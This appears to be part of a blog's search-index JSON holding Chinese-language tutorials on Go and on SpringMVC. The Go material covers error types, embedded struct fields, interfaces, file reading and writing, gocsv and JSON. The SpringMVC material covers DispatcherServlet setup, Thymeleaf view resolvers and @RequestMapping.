&#123;\td, err := divide(4, 0)\tif err != nil &#123; fmt.Println(&quot;错误：&quot;, err)\t&#125; else &#123; fmt.Println(&quot;结果：&quot;, d)\t&#125;&#125; 自定义错误类型123456789101112131415161718192021222324252627package mainimport &quot;fmt&quot;type MyError struct &#123;\tWhen string\tWhat string&#125;func (e *MyError) Error() string &#123;\treturn fmt.Sprintf(&quot;在 %s 发生错误: %s&quot;, e.When, e.What)&#125;func run() error &#123;\terr := &amp;MyError&#123; When: &quot;2020-10-20&quot;, What: &quot;程序出错&quot;,\t&#125;\treturn err&#125;func main() &#123;\terror := run()\tif error != nil &#123; fmt.Println(error)\t&#125;&#125; 面向对象匿名字段go支持只提供类型而不写字段名的方式，也就是匿名字段，也称为嵌入字段 12345678910type Person struct &#123;\tname string\tsex byte\tage int&#125;type Student struct &#123;\tPerson\t// 匿名字段，只有类型，没有名字。它继承了Person的所有成员\tid int\taddr string&#125; 匿名字段初始化 123456789// 初始化s1 := Student&#123;Person&#123;&quot;5lmh&quot;, &quot;man&quot;, 20&#125;, 1, &quot;bj&quot;&#125;fmt.Println(s1)s2 := Student&#123;Person: Person&#123;&quot;5lmh&quot;, &quot;man&quot;, 20&#125;&#125;fmt.Println(s2)s3 := Student&#123;Person: Person&#123;name: &quot;5lmh&quot;&#125;&#125;fmt.Println(s3) 123&#123;&#123;5lmh man 20&#125; 1 bj&#125; &#123;&#123;5lmh man 20&#125; 0 &#125; &#123;&#123;5lmh 0&#125; 0 &#125; 同名字段的情况 1234567891011121314151617181920212223242526272829package mainimport &quot;fmt&quot;//人type Person struct &#123; name string sex string age int&#125;type Student struct &#123; Person id int addr string //同名字段 name string&#125;func main() &#123; var s Student // 给自己字段赋值了 s.name = &quot;5lmh&quot; fmt.Println(s) // 若给父类同名字段赋值，如下 s.Person.name = &quot;枯藤&quot; fmt.Println(s)&#125; 输出结果： 12&#123;&#123; 0&#125; 0 5lmh&#125;&#123;&#123;枯藤 0&#125; 0 5lmh&#125; 所有的内置类型和自定义类型都是可以作为匿名字段去使用 12345678910111213141516171819202122232425package mainimport &quot;fmt&quot;//人type Person struct &#123; name string sex string age int&#125;// 自定义类型type mystr string// 学生type Student struct &#123; Person int mystr&#125;func main() &#123; s1 := Student&#123;Person&#123;&quot;5lmh&quot;, &quot;man&quot;, 18&#125;, 1, &quot;bj&quot;&#125; fmt.Println(s1)&#125; 输出结果： 1&#123;&#123;5lmh man 18&#125; 1 bj&#125; 指针类型匿名字段 123456789101112131415161718192021222324package mainimport &quot;fmt&quot;//人type Person struct &#123; name string sex string age int&#125;// 学生type Student struct &#123; *Person id int addr string&#125;func main() &#123; s1 := Student&#123;&amp;Person&#123;&quot;5lmh&quot;, &quot;man&quot;, 18&#125;, 1, &quot;bj&quot;&#125; fmt.Println(s1) fmt.Println(s1.name) fmt.Println(s1.Person.name)&#125; 输出结果： 123&#123;0x140001220c0 1 bj&#125;5lmh5lmh 接口接口（interface）是 Go 语言中的一种类型，用于定义行为的集合，它通过描述类型必须实现的方法，规定了类型的行为契约。 Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。 Go 的接口设计简单却功能强大，是实现多态和解耦的重要工具。 接口可以让我们将不同的类型绑定到一组公共的方法上，从而实现多态和灵活的设计。 实现： Go 中没有关键字显式声明某个类型实现了某个接口。 只要一个类型实现了接口要求的所有方法，该类型就自动被认为实现了该接口。 接口类型变量： 接口变量可以存储实现该接口的任意值。 接口变量实际上包含了两个部分： 动态类型：存储实际的值类型。 动态值：存储具体的值。 零值接口： 接口的零值是 nil。 一个未初始化的接口变量其值为 nil，且不包含任何动态类型或值。 空接口： 定义为 interface&#123;&#125;，可以表示任何类型。 接口的常见用法 多态：不同类型实现同一接口，实现多态行为。 解耦：通过接口定义依赖关系，降低模块之间的耦合。 泛化：使用空接口 interface&#123;&#125; 表示任意类型。 定义接口 1234type Shape interface &#123; Area() float64 Perimeter() float64&#125; Shape 是一个接口，定义了两个方法：Area 和 Perimeter。 任意类型只要实现了这两个方法，就被认为实现了 Shape 接口。 实现接口: 类型通过实现接口要求的所有方法来实现接口。 123456789101112//定义一个圆type Circle struct &#123; Radius float64&#125;// Circle类型实现Shape接口(实现了Area和Perimeter方法)func (c Circle) Area() float64 &#123; return math.Pi * c.Radius * c.Radius&#125;func (c Circle) Perimeter() float64 &#123; return 2 * math.Pi * c.Radius&#125; 初始化接口： 1var s Shape = Circle&#123;Radius: 1&#125; //接口变量可以存储实现了接口的类型的对象 当一个类型位于一个接口的类型集内，且该类型的值可以由该接口类型的变量存储，那么称该类型实现了该接口。 完整代码 12345678910111213141516171819202122232425262728293031package mainimport (\t&quot;fmt&quot;\t&quot;math&quot;)//定义接口type Shape interface &#123; Area() float64 Perimeter() float64&#125;//定义一个圆type Circle struct &#123; Radius float64&#125;// Circle类型实现Shape接口(实现了Area和Perimeter方法)func (c Circle) Area() float64 &#123; return math.Pi * c.Radius * c.Radius&#125;func (c Circle) Perimeter() float64 &#123; return 2 * math.Pi * c.Radius&#125;func main() &#123; var s Shape = Circle&#123;Radius: 1&#125; //接口变量可以存储实现了接口的类型的对象 fmt.Println(&quot;Area: &quot;, s.Area()) fmt.Println(&quot;Perimeter: &quot;, s.Perimeter())&#125; 文件操作打开文件常见的两种打开文件的方式是使用os包提供的两个函数，Open函数返回值一个文件指针和一个错误，常见的两种打开文件的方式是使用os包提供的两个函数，Open函数返回值一个文件指针和一个错误，文件的查找路径默认为项目go.mod文件所在的路径。 12345678910// 读取文件 Open仅仅只是只读的，无法被修改file, err := os.Open(&quot;1.txt&quot;)if os.IsNotExist(err) &#123;\tfmt.Println(&quot;File not found&quot;)&#125; else if err != nil &#123;\tlog.Fatal(err)&#125; else &#123;\tfmt.Println(&quot;File found:&quot;, file)\tdefer file.Close()&#125; 通过OpenFile函数可以控制更多细节，例如修改文件描述符和文件权限，关于文件描述符，os包下提供了以下常量以供使用。 123456789101112const ( // 只读，只写，读写 三种必须指定一个 O_RDONLY int = syscall.O_RDONLY // 以只读的模式打开文件 O_WRONLY int = syscall.O_WRONLY // 以只写的模式打开文件 O_RDWR int = syscall.O_RDWR // 以读写的模式打开文件 // 剩余的值用于控制行为 O_APPEND int = syscall.O_APPEND // 当写入文件时，将数据添加到文件末尾 O_CREATE int = syscall.O_CREAT // 如果文件不存在则创建文件 O_EXCL int = syscall.O_EXCL // 与O_CREATE一起使用, 文件必须不存在 O_SYNC int = syscall.O_SYNC // 以同步IO的方式打开文件 O_TRUNC int = syscall.O_TRUNC // 当打开的时候截断可写的文件) 关于文件权限的则提供了以下常量。 1234567891011121314151617181920const ( ModeDir = fs.ModeDir // d: 目录 ModeAppend = fs.ModeAppend // a: 只能添加 ModeExclusive = fs.ModeExclusive // l: 专用 ModeTemporary = fs.ModeTemporary // T: 临时文件 ModeSymlink = fs.ModeSymlink // L: 符号链接 ModeDevice = fs.ModeDevice // D: 设备文件 ModeNamedPipe = fs.ModeNamedPipe // p: 具名管道 (FIFO) ModeSocket = fs.ModeSocket // S: Unix 域套接字 ModeSetuid = fs.ModeSetuid // u: setuid ModeSetgid = fs.ModeSetgid // g: setgid ModeCharDevice = fs.ModeCharDevice // c: Unix 字符设备, 前提是设置了 ModeDevice ModeSticky = fs.ModeSticky // t: 黏滞位 ModeIrregular = fs.ModeIrregular // ?: 非常规文件 // 类型位的掩码. 对于常规文件而言，什么都不会设置. ModeType = fs.ModeType ModePerm = fs.ModePerm // Unix 权限位, 0o777) 下面是一个以读写模式打开一个文件的代码例子，权限为0666，表示为所有人都可以对该文件进行读写，且不存在时会自动创建。 12345678file2, err := os.OpenFile(&quot;README.md&quot;, os.O_RDWR|os.O_CREATE, 0666)if os.IsNotExist(err) &#123;\tfmt.Println(&quot;File not found&quot;)&#125; else if err != nil &#123;\tlog.Fatal(err)&#125; else &#123;\tfmt.Println(&quot;File found:&quot;, file2.Name())&#125; 倘若只是想获取该文件的一些信息，并不想读取该文件，可以使用os.Stat()函数进行操作，代码示例如下 123456info, err := os.Stat(&quot;README.md&quot;)\tif err != nil &#123; log.Fatal(err)\t&#125; else &#123; fmt.Println(fmt.Sprintf(&quot;File found:%+v&quot;, info))\t&#125; 注意 打开一个文件后永远要记得关闭该文件，通常关闭操作会放在defer语句里 1defer file.Close() 读取文件比较简单的两种 os.ReadFile，io.ReadAll 123456bytes, err := os.ReadFile(&quot;1.txt&quot;)if err != nil &#123;\tlog.Fatal(err)&#125; else &#123;\tfmt.Println(string(bytes))&#125; io.ReadAll 与 os.ReadFile 不同的是它接受的参数不是文件路径，而是 io.Reader 接口的实现,恰好os.OpenFile 打开一个文件，它返回的 *os.File 类型就实现了 io.Reader 接口 1234567891011121314f, err := os.Open(&quot;1.txt&quot;)\tif os.IsNotExist(err) &#123; fmt.Println(&quot;File not found&quot;)\t&#125; else if err != nil &#123; log.Fatal(err)\t&#125; else &#123; fmt.Println(&quot;File found:&quot;, f.Name()) all, err := io.ReadAll(f) if err != nil &#123; log.Fatal(err) &#125; else &#123; fmt.Println(string(all)) &#125;\t&#125; 文件写入os.File结构体提供了以下几种方法以供写入数据 12345678// 写入字节切片func (f *File) Write(b []byte) (n int, err error)// 写入字符串func (f *File) WriteString(s string) (n int, err error)// 从指定位置开始写，当以os.O_APPEND模式打开时，会返回错误func (f *File) WriteAt(b []byte, off int64) (n int, err error) 如果想要对一个文件写入数据，则必须以O_WRONLY或O_RDWR的模式打开，否则无法成功写入文件。 123456789101112131415f1, err := os.OpenFile(&quot;1.txt&quot;, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)\tif os.IsNotExist(err) &#123; fmt.Println(&quot;File not found&quot;)\t&#125; else if err != nil &#123; log.Fatal(err)\t&#125; else &#123; fmt.Println(&quot;File found:&quot;, f1.Name()) n, err := f1.WriteString(&quot;MakkaPakka &quot;) if err != nil &#123; log.Fatal(err) &#125; else &#123; fmt.Println(n) &#125; f1.Close()\t&#125; 用 gocsv 库对 csv 文件进行操作gocsv包的最基本的作用就是能够方便的将csv内容转换到对应的结构体上，或者将结构体的内容快速的转换成csv格式（包括写入文件）。 1234client_id,client_name,client_age1,Jose,422,Daniel,263,Vincent,32 gocsv.UnmarshalFile函数：csv内容转成结构体。 我们可以从文件中读取出内容，并直接转换到结构体Client上，如下： 123456789101112131415161718192021222324252627282930313233343536package mainimport (\t&quot;fmt&quot;\t&quot;os&quot;\t&quot;github.com/gocarina/gocsv&quot;)type NotUsed struct &#123;\tName string&#125;type Client struct &#123; // Our example struct, you can use &quot;-&quot; to ignore a field\tId string `csv:&quot;client_id&quot;`\tName string `csv:&quot;client_name&quot;`\tAge string `csv:&quot;client_age&quot;`\tNotUsedString string `csv:&quot;-&quot;`\tNotUsedStruct NotUsed `csv:&quot;-&quot;`&#125;func main() &#123;\tclientsFile, err := os.OpenFile(&quot;1.csv&quot;, os.O_RDWR|os.O_CREATE, os.ModePerm)\tif err != nil &#123; panic(err)\t&#125;\tdefer clientsFile.Close()\tclients := []*Client&#123;&#125;\tif err := gocsv.UnmarshalFile(clientsFile, &amp;clients); err != nil &#123; // Load clients from file panic(err)\t&#125;\tfor _, client := range clients &#123; fmt.Println(&quot;Hello&quot;, client.Name)\t&#125;&#125; gocsv.MarshalFile函数：结构体转成csv文件 1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;github.com/gocarina/gocsv&quot;)type NotUsed struct &#123; Name string&#125;type Client struct &#123; // Our example struct, you can use &quot;-&quot; to ignore a field Id string `csv:&quot;client_id&quot;` Name string `csv:&quot;client_name&quot;` Age string `csv:&quot;client_age&quot;` NotUsedString string `csv:&quot;-&quot;` NotUsedStruct NotUsed `csv:&quot;-&quot;` &#125;func main() &#123; clientsFile, err := os.OpenFile(&quot;clients.csv&quot;, os.O_RDWR|os.O_CREATE, os.ModePerm) if err != nil &#123; panic(err) &#125; defer clientsFile.Close() clients := []*Client&#123;&#125; clients = append(clients, &amp;Client&#123;Id: &quot;12&quot;, Name: &quot;John&quot;, Age: &quot;21&quot;&#125;) // Add clients clients = append(clients, &amp;Client&#123;Id: &quot;13&quot;, Name: &quot;Fred&quot;&#125;) clients = append(clients, &amp;Client&#123;Id: &quot;14&quot;, Name: &quot;James&quot;, Age: &quot;32&quot;&#125;) clients = append(clients, &amp;Client&#123;Id: &quot;15&quot;, Name: &quot;Danny&quot;&#125;) err = gocsv.MarshalFile(&amp;clients, clientsFile) // Use this to save the CSV back to the file if err != nil &#123; panic(err) &#125;&#125; gocsv包还可以给自定义的结构体类型定义csv和结构体的互转函数。只要自定义的类型实现如下接口即可： 123456789type TypeMarshaller interface &#123;\tMarshalCSV() (string, error)&#125;// TypeUnmarshaller is implemented by any value that has an UnmarshalCSV method// This converter is used to convert a string to your value representation of that stringtype TypeUnmarshaller interface &#123;\tUnmarshalCSV(string) error&#125; 或者将结构体转换成csv字符串时，需要实现如下接口： 12345678// MarshalText encodes the receiver into UTF-8-encoded text and returns the result.type TextMarshaler interface &#123;\tMarshalText() (text []byte, err error)&#125;type TextUnmarshaler interface &#123;\tUnmarshalText(text []byte) error&#125; 例如，我们定义了一个结构体DateTime，里面有一个time.Time类型的属性。并且DateTime类型实现了TypeMarshaller接口的MarshalCSV函数和TypeUnmarshaller接口的UnmarshalCSV函数。如下： 12345678910111213141516171819202122232425262728293031package mainimport (\t&quot;fmt&quot;\t&quot;github.com/gocarina/gocsv&quot;\t&quot;time&quot;)type DateTime struct &#123;\ttime.Time&#125;type Client struct &#123; // Our example struct, you can use &quot;-&quot; to ignore a field\tId string `csv:&quot;id&quot;`\tName string `csv:&quot;name&quot;`\tEmployed DateTime `csv:&quot;employed&quot;`&#125;func (date *DateTime) MarshalCSV() (string, error) &#123;\treturn date.Time.Format(&quot;2006年01月02日&quot;), nil&#125;func main() &#123;\tclient := []Client&#123; &#123; Id: &quot;1&quot;, Name: &quot;Qin&quot;, Employed: DateTime&#123;time.Now()&#125;, &#125;&#125;\tcsvContent, _ := gocsv.MarshalString(client)\tfmt.Println(&quot;csv:&quot;, csvContent)&#125; Json 操作json在Restful风格的接口通信中经常会用到，其相较于xml更轻便的大小，低廉的学习成本使其在web领域称为了主流的数据交换格式。 在 go 中，encoding/json包下提供对应的函数来进行 json 的序列化与反序列化，主要使用的有如下函数。 123func Marshal(v any) ([]byte, error) //将go对象序列化为json字符串func Unmarshal(data []byte, v any) error //将json字符串反序列化为go对象 123456789101112131415161718192021222324252627282930// json 操作package mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;)type Person struct &#123;\tUserId string\tUsername string\tAge int\tAddress string&#125;func main() &#123;\tperson := Person&#123; UserId: &quot;120&quot;, Username: &quot;jack&quot;, Age: 18, Address: &quot;usa&quot;,\t&#125;\tmarshal, err := json.Marshal(person)\tif err != nil &#123; fmt.Println(err)\t&#125; else &#123; fmt.Println(string(marshal))\t&#125;&#125; 输出 1&#123;&quot;UserId&quot;:&quot;120&quot;,&quot;Username&quot;:&quot;jack&quot;,&quot;Age&quot;:18,&quot;Address&quot;:&quot;usa&quot;&#125; 我们可以通过结构体标签来达到重命名的效果。 123456type Person struct &#123;\tUserId string `json:&quot;id&quot;`\tUsername string `json:&quot;user&quot;`\tAge int `json:&quot;age&quot;`\tAddress string `json:&quot;adr&quot;`&#125; 输出 1&#123;&quot;id&quot;:&quot;120&quot;,&quot;user&quot;:&quot;jack&quot;,&quot;age&quot;:18,&quot;adr&quot;:&quot;usa&quot;&#125; 缩进 序列化时默认是没有任何缩进的，这是为了减少传输过程的空间损耗，但是这并不利于人为观察，在一些情况下我们需要将其序列化成人类能够观察的形式。为此，只需要换一个函数。 1func MarshalIndent(v any, prefix, indent string) ([]byte, error) 1marshal, err := json.MarshalIndent(person, &quot;&quot;, &quot; &quot;) 输出 123456&#123; &quot;UserId&quot;: &quot;120&quot;, &quot;Username&quot;: &quot;jack&quot;, &quot;Age&quot;: 18, &quot;Address&quot;: &quot;usa&quot;&#125;","tags":["go 开发"],"categories":["开发"]},{"title":"SpringMVC 学习","path":"/2024/09/09/java/开发/SpringMVC/","content":"没事干我就学开发，嘿嘿嘿 SpringMVC0x01 回顾MVC MVC是模型(Model)、视图(View)、控制器(Controller)的简写，是一种软件设计规范。 是将业务逻辑、数据、显示分离的方法来组织代码。 MVC主要作用是降低了视图与业务逻辑间的双向偶合。 MVC不是一种设计模式，MVC是一种架构模式。当然不同的MVC存在差异。 Model（模型）：数据模型，提供要展示的数据，因此包含数据和行为，可以认为是领域模型或JavaBean组件（包含数据和行为），不过现在一般都分离开来：Value Object（数据Dao） 和 服务层（行为Service）。也就是模型提供了模型数据查询和模型数据的状态更新等功能，包括数据和业务。 View（视图）：负责进行模型的展示，一般就是我们见到的用户界面，客户想看到的东西。 Controller（控制器）：接收用户请求，委托给模型进行处理（状态改变），处理完毕后把返回的模型数据返回给视图，由视图负责展示。 也就是说控制器做了个调度员的工作。 最典型的MVC就是JSP + servlet + javabean的模式。 Model1时代 在web早期的开发中，通常采用的都是Model1。 Model1中，主要分为两层，视图层和模型层。 Model1优点：架构简单，比较适合小型项目开发； Model1缺点：JSP职责不单一，职责过重，不便于维护； Model2时代Model2 把一个项目分成三部分，包括视图、控制、模型。 用户发请求 Servlet接收请求数据，并调用对应的业务逻辑方法 业务处理完毕，返回更新后的数据给servlet servlet转向到JSP，由JSP来渲染页面 响应给前端更新后的页面 职责分析： Controller：控制器 取得表单数据 调用业务逻辑 转向指定的页面 Model：模型 业务逻辑 保存数据的状态 View：视图 显示页面 Model2这样不仅提高的代码的复用率与项目的扩展性，且大大降低了项目的维护成本。Model 1模式的实现比较简单，适用于快速开发小规模项目，Model1中JSP页面身兼View和Controller两种角色，将控制逻辑和表现逻辑混杂在一起，从而导致代码的重用性非常低，增加了应用的扩展性和维护的难度。Model2消除了Model1的缺点。 MVC框架要做哪些事情 将url映射到java类或java类的方法 . 封装用户提交的数据 . 处理请求—调用相关的业务处理—封装响应数据 . 将响应的数据进行渲染 . jsp &#x2F; html 等表示层数据 . 说明： 常见的服务器端MVC框架有：Struts、Spring MVC、ASP.NET MVC、Zend Framework、JSF；常见前端MVC框架：vue、angularjs、react、backbone；由MVC演化出了另外一些模式如：MVP、MVVM 等等…. 0x02 配置环境并搭建项目这里我们继续使用之前的Tomcat10服务器，Spring6之后要求必须使用Tomcat10或更高版本，跟之前一样，我们直接创建一个新的JakartaEE项目,java8 也可以，不过都 spring6 了还是体验一下 java17 吧。 传统XML配置形式SpringMvc项目依然支持多种配置形式，这里我们首先讲解最传统的XML配置形式。 首先我们需要添加Mvc相关依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;6.0.10&lt;/version&gt;&lt;/dependency&gt; 接着我们需要配置一下web.xml，将DispatcherServlet替换掉Tomcat自带的Servlet，这里url-pattern需要写为/，即可完成替换： 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;https://jakarta.ee/xml/ns/jakartaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_5_0.xsd&quot; version=&quot;5.0&quot;&gt; &lt;servlet&gt; &lt;servlet-name&gt;mvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;mvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 接着需要为整个Web应用程序配置一个Spring上下文环境（也就是容器），因为SpringMVC是基于Spring开发的，它直接利用Spring提供的容器来实现各种功能，那么第一步依然跟之前一样，需要编写一个配置文件： 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;&lt;/beans&gt; 接着我们需要为DispatcherServlet配置一些初始化参数来指定刚刚创建的配置文件： 123456789&lt;servlet&gt; &lt;servlet-name&gt;mvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;!-- 指定我们刚刚创建在类路径下的XML配置文件 --&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:application.xml&lt;/param-value&gt; &lt;/init-param&gt;&lt;/servlet&gt; 这样我们就完成了基本的配置，现在我们可以来测试一下是否配置正确，我们删除项目自带的Servlet类，创建一个Mvc中使用的Controller类，现在还没学没关系，跟着写就行了，这里我们只是测试一下： 12345678@Controllerpublic class HelloController &#123; @ResponseBody @RequestMapping(&quot;/&quot;) public String hello()&#123; return &quot;HelloWorld!&quot;; &#125;&#125; 接着我们需要将这个类注册为Bean才能正常使用，我们来编写一下Spring的配置文件，这里我们直接配置包扫描，XML下的包扫描需要这样开启： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;!-- 需要先引入context命名空间，然后直接配置base-package属性就可以了 --&gt; &lt;context:component-scan base-package=&quot;com.example&quot;/&gt;&lt;/beans&gt; 如果可以成功在浏览器中出现HelloWorld则说明配置成功(记得把 index.jsp 删掉)： 全注解配置形式如果你希望完完全全丢弃配置文件，使用纯注解开发，可以直接添加一个类，Tomcat会在类路径中查找实现ServletContainerInitializer 接口的类，如果发现的话，就用它来配置Servlet容器，Spring提供了这个接口的实现类 SpringServletContainerInitializer , 通过@HandlesTypes(WebApplicationInitializer.class)设置，这个类反过来会查找实现WebApplicationInitializer 的类，并将配置的任务交给他们来完成，因此直接实现接口即可： 1234567891011121314151617public class MainInitializer extends AbstractAnnotationConfigDispatcherServletInitializer &#123; @Override protected Class&lt;?&gt;[] getRootConfigClasses() &#123; return new Class[]&#123;WebConfiguration.class&#125;; //基本的Spring配置类，一般用于业务层配置 &#125; @Override protected Class&lt;?&gt;[] getServletConfigClasses() &#123; return new Class[0]; //配置DispatcherServlet的配置类、主要用于Controller等配置，这里为了教学简单，就不分这么详细了，只使用上面的基本配置类 &#125; @Override protected String[] getServletMappings() &#123; return new String[]&#123;&quot;/&quot;&#125;; //匹配路径，与上面一致 &#125;&#125; 接着我们需要再配置类中添加一些必要的注解： 12345@Configuration@EnableWebMvc //快速配置SpringMvc注解，如果不添加此注解会导致后续无法通过实现WebMvcConfigurer接口进行自定义配置@ComponentScan(&quot;com.shellf.controller&quot;)public class WebConfiguration &#123;&#125; 这样我们同样可以正常访问： 之后为了方便，我们就统一使用全注解形式编写。 0x03 Controller控制器有了 SpringMVC 之后，我们不必再像之前那样一个请求地址创建一个 Servlet 了，它使用 DispatcherServlet 替代 Tomcat 为我们提供的默认的静态资源 Servlet，也就是说，现在所有的请求（除了jsp，因为Tomcat还提供了一个jsp的Servlet）都会经过DispatcherServlet进行处理。 那么DispatcherServlet会帮助我们做什么呢？ 根据图片我们可以了解，我们的请求到达Tomcat服务器之后，会交给当前的Web应用程序进行处理，而 SpringMVC 使用DispatcherServlet来处理所有的请求，也就是说它被作为一个统一的访问点，所有的请求全部由它来进行调度。 当一个请求经过DispatcherServlet之后，会先走HandlerMapping，它会将请求映射为HandlerExecutionChain，依次经过HandlerInterceptor有点类似于之前我们所学的过滤器，不过在SpringMVC中我们使用的是拦截器，然后再交给HandlerAdapter，根据请求的路径选择合适的控制器进行处理，控制器处理完成之后，会返回一个ModelAndView对象，包括数据模型和视图，通俗的讲就是页面中数据和页面本身（只包含视图名称即可）。 返回ModelAndView之后，会交给ViewResolver（视图解析器）进行处理，视图解析器会对整个视图页面进行解析，SpringMVC自带了一些视图解析器，但是只适用于JSP页面，我们也可以像之前一样使用Thymeleaf作为视图解析器，这样我们就可以根据给定的视图名称，直接读取HTML编写的页面，解析为一个真正的View。 解析完成后，就需要将页面中的数据全部渲染到View中，最后返回给DispatcherServlet一个包含所有数据的成形页面，再响应给浏览器，完成整个过程。 因此，实际上整个过程我们只需要编写对应请求路径的的Controller以及配置好我们需要的ViewResolver即可，之后还可以继续补充添加拦截器，而其他的流程已经由SpringMVC帮助我们完成了。 配置视图解析器和控制器首先我们需要实现最基本的页面解析并返回，第一步就是配置视图解析器，这里我们使用Thymeleaf为我们提供的视图解析器，导入需要的依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-spring6&lt;/artifactId&gt; &lt;version&gt;3.1.1.RELEASE&lt;/version&gt;&lt;/dependency&gt; 配置视图解析器非常简单，我们只需要将对应的ViewResolver注册为Bean即可，这里我们直接在配置类中编写： 123456789101112131415161718192021222324252627282930313233//快速配置SpringMvc注解，如果不添加此注解会导致后续无法通过实现WebMvcConfigurer接口进行自定义配置@ComponentScan(&quot;com.she11f.controller&quot;)@Configuration@EnableWebMvc@ComponentScan(&quot;com.she11f.controller&quot;)public class WebConfiguration &#123; //我们需要使用ThymeleafViewResolver作为视图解析器，并解析我们的HTML页面 @Bean public ThymeleafViewResolver thymeleafViewResolver(SpringTemplateEngine springTemplateEngine)&#123; ThymeleafViewResolver resolver = new ThymeleafViewResolver(); resolver.setOrder(1); //可以存在多个视图解析器，并且可以为他们设定解析顺序 resolver.setCharacterEncoding(&quot;UTF-8&quot;); //编码格式是重中之重 resolver.setTemplateEngine(springTemplateEngine); //和之前JavaWeb阶段一样，需要使用模板引擎进行解析，所以这里也需要设定一下模板引擎 return resolver; &#125; //配置模板解析器 @Bean public SpringResourceTemplateResolver templateResolver()&#123; SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver(); resolver.setSuffix(&quot;.html&quot;); //需要解析的后缀名称 resolver.setPrefix(&quot;/&quot;); //需要解析的HTML页面文件存放的位置，默认是webapp目录下，如果是类路径下需要添加classpath:前缀 return resolver; &#125; //配置模板引擎Bean @Bean public SpringTemplateEngine springTemplateEngine(ITemplateResolver resolver)&#123; SpringTemplateEngine engine = new SpringTemplateEngine(); engine.setTemplateResolver(resolver); //模板解析器，默认即可 return engine; &#125;&#125; 现在我们就完成了视图解析器的配置，我们接着来创建一个Controller，创建Controller也非常简单，只需在一个类上添加一个@Controller注解即可，它会被Spring扫描并自动注册为Controller类型的Bean，然后我们只需要在类中编写方法用于处理对应地址的请求即可： 123456789@Controller //直接添加注解即可public class HelloController &#123; @RequestMapping(&quot;/index&quot;) //直接填写访问路径 public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;); //返回ModelAndView对象，这里填入了视图的名称 //返回后会经过视图解析器进行处理 &#125;&#125; 接着我们在类路径根目录下创建一个简单html文件： 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;欢迎来到GayHub全球最大同性交友网站&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 我们会发现，打开浏览器之后就可以直接访问我们的HTML页面了 如果乱码了，在SpringResourceTemplateResolver这个bean中，添加三行set 123resolver.setTemplateMode(&quot;HTML5&quot;);resolver.setCacheable(false);resolver.setCharacterEncoding(&quot;utf-8&quot;); 我们在之前，使用Thymeleaf解析后端的一些数据时，需要通过Context进行传递，而使用SpringMvc后，数据我们可以直接向Model模型层进行提供： 123456@RequestMapping(value = &quot;/index&quot;)public ModelAndView index()&#123; ModelAndView modelAndView = new ModelAndView(&quot;index&quot;); modelAndView.getModel().put(&quot;name&quot;, &quot;啊这&quot;); //将name传递给Model return modelAndView;&#125; @RequestMapping详解前面我们已经了解了如何创建一个控制器来处理我们的请求，接着我们只需要在控制器添加一个方法用于处理对应的请求即可，之前我们需要完整地编写一个Servlet来实现，而现在我们只需要添加一个@RequestMapping即可实现，其实从它的名字我们也能得知，此注解就是将请求和处理请求的方法建立一个映射关系，当收到请求时就可以根据映射关系调用对应的请求处理方法，那么我们就来先聊聊@RequestMapping吧，注解定义如下 1234567891011121314151617181920@Mappingpublic @interface RequestMapping &#123; String name() default &quot;&quot;; @AliasFor(&quot;path&quot;) String[] value() default &#123;&#125;; @AliasFor(&quot;value&quot;) String[] path() default &#123;&#125;; RequestMethod[] method() default &#123;&#125;; String[] params() default &#123;&#125;; String[] headers() default &#123;&#125;; String[] consumes() default &#123;&#125;; String[] produces() default &#123;&#125;;&#125; 其中最关键的是path属性（等价于value），它决定了当前方法处理的请求路径，注意路径必须全局唯一，任何路径只能有一个方法进行处理，它是一个数组，也就是说此方法不仅仅可以只用于处理某一个请求路径，我们可以使用此方法处理多个请求路径： 1234@RequestMapping(&#123;&quot;/index&quot;, &quot;/test&quot;&#125;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; 现在我们访问&#x2F;index或是&#x2F;test都会经过此方法进行处理。 